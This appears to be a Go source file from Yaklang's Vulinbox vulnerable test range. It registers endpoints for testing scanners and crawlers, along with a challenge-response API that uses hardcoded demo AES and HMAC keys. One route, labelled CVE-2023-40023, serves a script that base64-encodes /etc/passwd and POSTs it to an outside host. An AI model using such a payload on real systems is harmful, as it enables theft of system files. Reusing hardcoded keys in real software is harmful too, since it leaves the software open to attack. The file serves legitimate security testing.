package vulinbox

import (
	"bytes"
	"crypto/aes"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	mrand "math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
)

var (
	// 预共享密钥，客户端和服务端需要保持一致
	apiChallengeAESKey  = []byte("YakitVulinboxAES") // 16 bytes for AES-128
	apiChallengeHMACKey = []byte("YakitVulinboxHMACKey-SIGNATURE")
)

// 为简化示例，使用包级别变量作为 nonce 缓存
// 在生产环境中，应该使用更健壮的缓存机制，例如 Redis，并为每个用户会话管理 nonce
var (
	lastNonce   []byte
	nonceExpiry time.Time
)

func (s *VulinServer) registerMiscRoute() {
	router := s.router

	handle := func(writer http.ResponseWriter, request *http.Request) {
		writer.Header().Set("Content-Type", "text/html; charset=utf-8")
		writer.Write([]byte(`<script>
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "http://yakit.com/filesubmit");
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("file={{base64enc(file(/etc/passwd))}}");
</script>`))
	}
	r := router.PathPrefix("/cve").Name("yakit cve poc 环境").Subrouter()
	addRouteWithVulInfo(r, &VulInfo{
		Path:    `/CVE-2023-40023`,
		Title:   "CVE-2023-40023",
		Handler: handle,
	})
	s.router.HandleFunc("/CVE-2023-40023", handle)
	s.registerMiscResponse()
	s.registerChallengeAPI()
}

func (s *VulinServer) registerMiscResponse() {
	router := s.router

	r := router.PathPrefix("/misc/response").Name("一些精心构造的畸形/异常/测试响应").Subrouter()
	addRouteWithVulInfo(r, &VulInfo{
		Handler: expect100handle, Title: "100-Continue", Path: "/expect100",
	})
	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			writer.Header().Set("Content-Type", "text/plain; charset=utf-8")
			start := time.Now()
			for {
				writer.Write([]byte("Hello Long-Time Chunked now is " + time.Now().Format("2006-01-02 15:04:05") + "\n"))
				utils.FlushWriter(writer)
				time.Sleep(time.Second * 1)
				if time.Since(start) > time.Second*60 {
					break
				}
			}
		},
		Title: "Long-Time Chunked 测试",
		Path:  "/long-time-chunked",
	})
	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			writer.Header().Set("Content-Type", "text/html; charset=utf-8")
			writer.Header().Set("X-Info", `This is a test for too large body(50MB) chunked, if u see this but no body, it's save`)
			writer.Write([]byte(strings.Repeat("a", 1024*1024*50))) // 50MB
		},
		Title: "TooLarge Body Chunked 测试",
		Path:  "/too-large-body-chunked",
	})
	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			redirectTimes := codec.Atoi(request.URL.Query().Get("times"))
			if redirectTimes > 0 {
				http.Redirect(writer, request, "/misc/response/redirect?times="+strconv.Itoa(redirectTimes-1), http.StatusFound)
			} else {
				writer.WriteHeader(http.StatusOK)
				writer.Write([]byte("finished"))
			}
		},
		Title:        "redirect-test",
		DefaultQuery: "times=5",
		Path:         "/redirect",
	})
	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			defer func() {
				if err := recover(); err != nil {
					log.Error(err)
				}
			}()
			ret := codec.Atoi(request.URL.Query().Get("cl"))
			writer.Write(bytes.Repeat([]byte{'a'}, ret))
		},
		Path:         "/content_length",
		DefaultQuery: "cl=1024",
		Title:        "通过(cl=int)定义响应体长度",
	})

	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			writer.Header().Set("Content-Type", "text/html; charset=utf-8")
			writer.Write([]byte(`<body>
	
<a href="#">this is a ssa ir js test spa</a>

<div id='app'></div>	

<script>
!function(c){function e(e){for(var t,r,n=e[0],o=e[1],u=e[2],a=0,i=[];a<n.length;a++)r=n[a],Object.prototype.hasOwnProperty.call(p,r)&&p[r]&&i.push(p[r][0]),p[r]=0;for(t in o)Object.prototype.hasOwnProperty.call(o,t)&&(c[t]=o[t]);for(d&&d(e);i.length;)i.shift()();return f.push.apply(f,u||[]),l()}function l(){for(var e,t=0;t<f.length;t++){for(var r=f[t],n=!0,o=1;o<r.length;o++){var u=r[o];0!==p[u]&&(n=!1)}n&&(f.splice(t--,1),e=s(s.s=r[0]))}return e}var r={},p={1:0},f=[];function s(e){if(r[e])return r[e].exports;var t=r[e]={i:e,l:!1,exports:{}};return c[e].call(t.exports,t,t.exports,s),t.l=!0,t.exports}s.e=function(o){var e=[],r=p[o];if(0!==r)if(r)e.push(r[2]);else{var t=new Promise(function(e,t){r=p[o]=[e,t]});e.push(r[2]=t);var n,u=document.createElement("script");u.charset="utf-8",u.timeout=120,s.nc&&u.setAttribute("nonce",s.nc),u.src=s.p+"static/js/"+({}[o]||o)+"."+{3:"51247ecb",4:"65676c3f"}[o]+".chunk.js";var a=new Error;n=function(e){u.onerror=u.onload=null,clearTimeout(i);var t=p[o];if(0!==t){if(t){var r=e&&("load"===e.type?"missing":e.type),n=e&&e.target&&e.target.src;a.message="Loading chunk "+o+" failed.\n("+r+": "+n+")",a.name="ChunkLoadError",a.type=r,a.request=n,t[1](a)}p[o]=void 0}};var i=setTimeout(function(){n({type:"timeout",target:u})},12e4);u.onerror=u.onload=n,document.head.appendChild(u)}return Promise.all(e)},s.m=c,s.c=r,s.d=function(e,t,r){s.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},s.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},s.t=function(t,e){if(1&e&&(t=s(t)),8&e)return t;if(4&e&&"object"==typeof t&&t&&t.__esModule)return t;var r=Object.create(null);if(s.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:t}),2&e&&"string"!=typeof t)for(var n in t)s.d(r,n,function(e){return t[e]}.bind(null,n));return r},s.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return s.d(t,"a",t),t},s.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},s.p="/",s.oe=function(e){throw console.error(e),e};var t=this["webpackJsonppalm-kit-desktop"]=this["webpackJsonppalm-kit-desktop"]||[],n=t.push.bind(t);t.push=e,t=t.slice();for(var o=0;o<t.length;o++)e(t[o]);var d=n;l()}([])
</script>
<script src='/static/js/spa/pre-main.js'></script>
<script src='/static/js/spa/main.js'></script>
</body>
`))
		},
		Path:  "/webpack-ssa-ir-test.html",
		Title: "测试普通爬虫的 Webpack 处理能力",
	})

	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			sentences := []string{
				`{"message": "漏洞靶场(Vulinbox) 为您提供了多种漏洞场景用于测试"}`,
				`{"message": "你可以测试扫描器处理重定向的能力"}`,
				`{"message": "试试看长时间 chunked 响应来测试处理挂起请求的能力"}`,
				`{"message": "content_length 端点允许你指定响应体的大小"}`,
				`{"message": "webpack 测试页面是为挑战 SPA 爬虫而设计的"}`,
				`{"message": "这个 JSON 响应包含 base64 编码的字符串，你的扫描器能解码吗？"}`,
				`{"message": "这是一个带有 base64 编码数据的 JSON 响应测试"}`,
				`{"message": "Yakit 的 Vulinbox 是一个强大的安全测试工具"}`,
				`{"message": "你试过 expect-100 continue 端点吗？"}`,
				`{"message": "超大响应体 chunked 响应是测试资源限制的好方法"}`,
				`{"message": "JS SSA IR 基础测试帮助你验证爬虫的 JS 执行能力"}`,
				`{"message": "重定向测试可以通过参数配置重定向次数"}`,
			}
			randomSentence := sentences[mrand.Intn(len(sentences))]

			encodedResult := codec.EncodeBase64(randomSentence)

			type responseData struct {
				Result    string `json:"result"`
				Timestamp int64  `json:"timestamp"`
			}

			type jsonResponse struct {
				Code int          `json:"code"`
				Data responseData `json:"data"`
			}

			response := jsonResponse{
				Code: 200,
				Data: responseData{
					Result:    encodedResult,
					Timestamp: time.Now().Unix(),
				},
			}

			writer.Header().Set("Content-Type", "application/json; charset=utf-8")
			err := json.NewEncoder(writer).Encode(response)
			if err != nil {
				log.Errorf("failed to encode json response: %v", err)
			}
		},
		Path:  "/json-base64-response",
		Title: "返回 Base64 编码数据的 JSON 响应（2025-06-23添加）",
	})

	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			writer.Write([]byte(`Hello Fetch Request is Fetched`))
		},
		Path: "/fetch/basic.action",
	})

	crawlerRoutes := []*VulInfo{
		{
			Path: "/javascript-ssa-ir-basic/1.js",
			Handler: func(writer http.ResponseWriter, request *http.Request) {
				writer.Header().Set("Content-Type", "application/javascript")
				writer.Write([]byte(`console.log('1.js'); var deepUrl = 'deep.js';`))
			},
		},
		{
			Path: "/javascript-ssa-ir-basic/2.js",
			Handler: func(writer http.ResponseWriter, request *http.Request) {
				writer.Header().Set("Content-Type", "application/javascript")
				writer.Write([]byte(`console.log('2.js'); fetch(deepUrl, {
	method: 'POST',
	headers: { 'HackedJS': "AAA"},
})`))
			},
		},
		{
			Path: "/javascript-ssa-ir-basic/deep.js",
			Handler: func(writer http.ResponseWriter, request *http.Request) {
				if request.Method == "POST" {
					if request.Header.Get(`HackedJS`) == "AAA" {
						writer.Write([]byte("SUCCESS IN DEEP!"))
						return
					}
				}
				writer.Write([]byte("BAD IN DEEP!"))
			},
		},
		{
			Path: "/javascript-ssa-ir-basic/3.js",
			Handler: func(writer http.ResponseWriter, request *http.Request) {
				writer.Header().Set("Content-Type", "application/javascript")
				writer.Write([]byte(`// 创建一个新的 XMLHttpRequest 对象
var xhr = new XMLHttpRequest();

// 配置请求类型为 POST，以及目标 URL
xhr.open('POST', 'deep.js', true);

// 设置所需的 HTTP 请求头
xhr.setRequestHeader('HackedJS', 'AAA');

// 设置请求完成后的回调函数
xhr.onreadystatechange = function() {
  // 检查请求是否完成
  if (xhr.readyState === XMLHttpRequest.DONE) {
    // 检查请求是否成功
    if (xhr.status === 200) {
      // 请求成功，处理响应数据
      console.log(xhr.responseText);
    } else {
      // 请求失败，打印状态码
      console.error('Request failed with status:', xhr.status);
    }
  }
};

// 发送请求，可以在此处发送任何需要的数据
xhr.send();`))
			},
		},
	}
	for _, route := range crawlerRoutes {
		addRouteWithVulInfo(r, route)
	}
	addRouteWithVulInfo(r, &VulInfo{
		Path: "/javascript-ssa-ir-basic/basic-fetch.html",
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			writer.Header().Set("Content-Type", "text/html; charset=utf-8")
			writer.Write([]byte(`<body>
	
<a href="#">this is a ssa ir js test spa</a>

<script src='1.js'></script>
<script src='2.js'></script>
<div id='app'></div>

<script>

fetch('/misc/response/fetch/basic.action')
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok ' + response.statusText);
    }
    return response.text();
  })
  .then(data => {
    console.log(data); // 这里是你的页面内容
  })
  .catch(error => {
    console.error('There has been a problem with your fetch operation:', error);
  });


</script>
<script src='4.js' defer></script>
<script src='3.js' defer></script>
</body>
`))
		},
		Title: "测试普通爬虫的基础JS处理能力",
	})
}

func (s *VulinServer) registerChallengeAPI() {
	// 1. 创建一个靶场说明页面
	// addRouteWithVulInfo(s.router.PathPrefix("/").Subrouter(), &VulInfo{
	// 	Path:  "/challenge-api-docs",
	// 	Title: "动态挑战-响应 API 安全靶场",
	// 	Handler: func(writer http.ResponseWriter, request *http.Request) {
	// 		writer.Header().Set("Content-Type", "text/html; charset=utf-8")
	// 		html := `
	// <!DOCTYPE html>
	// <html lang="zh-CN">
	// <head>
	//     <meta charset="UTF-8">
	//     <title>动态挑战-响应 API 安全靶场</title>
	//     <style>
	//         body { font-family: sans-serif; line-height: 1.6; padding: 20px; max-width: 800px; margin: auto; }
	//         h1, h2 { color: #333; }
	//         code { background-color: #f4f4f4; padding: 2px 6px; border-radius: 4px; }
	//         .workflow { text-align: center; margin: 20px 0; }
	//         .key { color: #c7254e; background-color: #f9f2f4; padding: 2px 4px; border-radius: 4px; }
	//     </style>
	// </head>
	// <body>
	//     <h1>动态挑战-响应 API 安全靶场</h1>
	//     <p>这是一个模拟真实世界高安全性API的靶场。它使用动态挑战-响应机制来防止重放攻击，并对业务数据进行加密传输。常规的Fuzzer很难成功请求此类型API。</p>
	//
	//     <h2>交互流程</h2>
	//     <div class="workflow">
	//         <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
	//         <script>mermaid.initialize({startOnLoad:true});</script>
	//         <div class="mermaid">
	//         sequenceDiagram
	//             participant Client as 客户端
	//             participant Server as 服务器
	//             Client->>Server: 1. GET /api/get-challenge
	//             Server-->>Client: 返回 {"challenge": "...", "iv": "..."}
	//             Client->>Client: 2. 解密 challenge 获取 nonce<br/>3. 使用 HMAC-SHA256(nonce) 计算签名
	//             Client->>Server: 4. GET /api/user/info<br/>Header: X-Auth-Signature: &lt;signature&gt;
	//             Server->>Server: 5. 验证签名，若通过则加密业务数据
	//             alt 签名有效
	//                 Server-->>Client: 200 OK {"data": "...", "iv": "..."}
	//             else 签名/挑战无效
	//                 Server-->>Client: 401 / 403 错误
	//             end
	//             Client->>Client: 6. 解密 data 获取最终信息
	//         </div>
	//     </div>
	//
	//     <h2>任务步骤</h2>
	//     <ol>
	//         <li>向 <code><a href="/api/get-challenge" target="_blank">/api/get-challenge</a></code> 发起GET请求，获取加密后的挑战 <code>challenge</code> 和初始化向量 <code>iv</code>。</li>
	//         <li>使用预共享的AES密钥和获取到的 <code>iv</code> 解密 <code>challenge</code>，得到原始的 <code>nonce</code>。
	//             <ul><li>AES密钥: <code class="key">YakitVulinboxAES</code></li></ul>
	//         </li>
	//         <li>使用预共享的HMAC密钥，通过HMAC-SHA256算法计算 <code>nonce</code> 的签名。
	//             <ul><li>HMAC密钥: <code class="key">YakitVulinboxHMACKey-SIGNATURE</code></li></ul>
	//         </li>
	//         <li>将计算出的签名（Hex格式）放入 <code>X-Auth-Signature</code> 请求头，向 <code>/api/user/info</code> 发起GET请求。</li>
	//         <li>如果签名正确，你将收到加密的业务数据。再次使用AES密钥和响应中的新 <code>iv</code> 解密，即可看到最终的敏感信息。</li>
	//     </ol>
	// </body>
	// </html>
	// `
	// 			writer.Write([]byte(html))
	// 		},
	// 	})

	apiRouter := s.router.PathPrefix("/api").Subrouter()

	// 2. 实现获取挑战的接口
	addRouteWithVulInfo(apiRouter, &VulInfo{
		Path:  "/get-challenge",
		Title: "动态挑战API - 步骤1: 获取挑战",
		Handler: func(w http.ResponseWriter, r *http.Request) {
			nonce := make([]byte, 32)
			if _, err := rand.Read(nonce); err != nil {
				log.Errorf("failed to generate nonce: %v", err)
				http.Error(w, "Failed to generate nonce", http.StatusInternalServerError)
				return
			}

			// 缓存 nonce 并设置60秒过期
			lastNonce = nonce
			nonceExpiry = time.Now().Add(60 * time.Second)
			log.Infof("generated and cached new nonce, valid for 60 seconds")

			iv := make([]byte, aes.BlockSize)
			if _, err := rand.Read(iv); err != nil {
				log.Errorf("failed to generate iv: %v", err)
				http.Error(w, "Failed to generate IV", http.StatusInternalServerError)
				return
			}

			encryptedNonce, err := codec.AESCBCEncrypt(apiChallengeAESKey, nonce, iv)
			if err != nil {
				log.Errorf("failed to encrypt challenge: %v", err)
				http.Error(w, "Failed to encrypt challenge", http.StatusInternalServerError)
				return
			}

			w.Header().Set("Content-Type", "application/json")
			_ = json.NewEncoder(w).Encode(map[string]string{
				"challenge": base64.StdEncoding.EncodeToString(encryptedNonce),
				"iv":        base64.StdEncoding.EncodeToString(iv),
			})
		},
	})

	// 3. 实现访问受保护资源的接口
	addRouteWithVulInfo(apiRouter, &VulInfo{
		Path:  "/user/info",
		Title: "动态挑战API - 步骤2: 访问受保护资源",
		Handler: func(w http.ResponseWriter, r *http.Request) {
			// 检查 nonce 是否存在且未过期
			if lastNonce == nil || time.Now().After(nonceExpiry) {
				log.Warn("attempt to use expired or non-existent nonce")
				http.Error(w, "Challenge expired or not found. Please request a new one from /api/get-challenge", http.StatusUnauthorized)
				return
			}
			currentNonce := lastNonce

			// 从请求头获取签名
			clientSignatureHex := r.Header.Get("X-Auth-Signature")
			if clientSignatureHex == "" {
				http.Error(w, "Missing X-Auth-Signature header", http.StatusBadRequest)
				return
			}

			// 计算期望的签名
			mac := hmac.New(sha256.New, apiChallengeHMACKey)
			mac.Write(currentNonce)
			expectedSignature := mac.Sum(nil)

			clientSignature, err := hex.DecodeString(clientSignatureHex)
			if err != nil {
				http.Error(w, "Invalid signature format; expected hex", http.StatusBadRequest)
				return
			}

			// 比较签名
			if !hmac.Equal(expectedSignature, clientSignature) {
				log.Warnf("invalid signature. Expected %s, got %s", hex.EncodeToString(expectedSignature), clientSignatureHex)
				http.Error(w, "Invalid signature", http.StatusForbidden)
				return
			}

			// 签名验证成功，立即作废 nonce 防止重放
			log.Info("signature validation successful, invalidating nonce.")
			lastNonce = nil

			// 构造并加密业务数据
			businessData := map[string]string{
				"user":       "admin",
				"email":      "admin@yaklang.io",
				"permission": "all",
				"message":    "Congratulations! You have successfully passed the challenge.",
				"used_nonce": hex.EncodeToString(currentNonce),
			}
			businessJSON, _ := json.Marshal(businessData)

			newIv := make([]byte, aes.BlockSize)
			if _, err := rand.Read(newIv); err != nil {
				log.Errorf("failed to generate IV for response: %v", err)
				http.Error(w, "Failed to generate IV for response", http.StatusInternalServerError)
				return
			}

			encryptedData, err := codec.AESCBCEncrypt(apiChallengeAESKey, businessJSON, newIv)
			if err != nil {
				log.Errorf("failed to encrypt response data: %v", err)
				http.Error(w, "Failed to encrypt response data", http.StatusInternalServerError)
				return
			}

			// 返回加密后的数据
			w.Header().Set("Content-Type", "application/json")
			_ = json.NewEncoder(w).Encode(map[string]string{
				"data": base64.StdEncoding.EncodeToString(encryptedData),
				"iv":   base64.StdEncoding.EncodeToString(newIv),
			})
		},
	})
}
